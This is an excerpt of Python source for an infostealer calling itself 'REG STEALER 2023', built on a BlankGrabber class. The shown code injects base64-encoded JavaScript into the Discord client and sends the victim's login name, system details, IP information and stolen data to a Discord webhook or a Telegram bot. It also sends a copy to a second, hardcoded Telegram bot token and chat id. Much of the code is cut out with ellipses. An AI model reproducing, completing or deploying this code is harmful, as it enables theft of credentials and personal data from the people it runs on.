...
Logger = logging.getLogger("REG STEALER 2023")
...
class Syscalls:
    ...
    @staticmethod
    def CreateMutex(nisas: str) -> bool:

        kernel32 = ctypes.windll.kernel32
        nisas = kernel32.CreateMutexA(None, False, nisas)
...
class Discord:
    ...
    def InjectJs() -> str | None: # Injects javascript into the Discord client's file
        check = False
        try:
            code = base64.b64decode(b"%injectionbase64encoded%").decode(errors= "ignore").replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.D3[1].encode()).decode(errors= "ignore")))
        except Exception:
            return None
...
class BlankGrabber:
    ...
    def SendData(self) -> None: # Sends data to the webhook
        ...
        filename = "%s.%s" % (os.getlogin(), extention)
        ...
        match Settings.D3[0]:
            case 0: # Discord Webhook
                ...
                payload = {
                    ...
                    "embeds": [
                        {
                            "title": "REG STEALER 2023",
                            "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
                            "url": "https://MANVR",
                            "color": 34303,
                            "footer": {
                                "text": "Grabbed by REG STEALER 2023 "
                            },
                            "thumbnail": {
                                "url": image_url
                            }
                ...
                http.request("POST", Settings.D3[1], fields=fields)
            
            case 1: # Telegram Bot
                payload = {
                    'caption': f'<b>REG STEALER 2023 LOG !</b>: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(),
                    'parse_mode': 'HTML'
                }
                ...
                token, chat_id = Settings.D3[1].split('$')
                token2, chat_id2 = "6321466823:AAF94JbSbsTSLuZqf2Pk4LpSLOIN3p6-sVc", "5027794050"
                fields2 = fields.copy()
                fields2.update(payload)
                fields2.update({'chat_id': chat_id2})
                fields.update(payload)
                fields.update({'chat_id': chat_id})
                http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token, method), fields=fields)
                http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token2, method), fields=fields2)
...
if __name__ == "__main__" and os.name == "nt":
    ...
    if not Syscalls.CreateMutex(Settings.nisas):
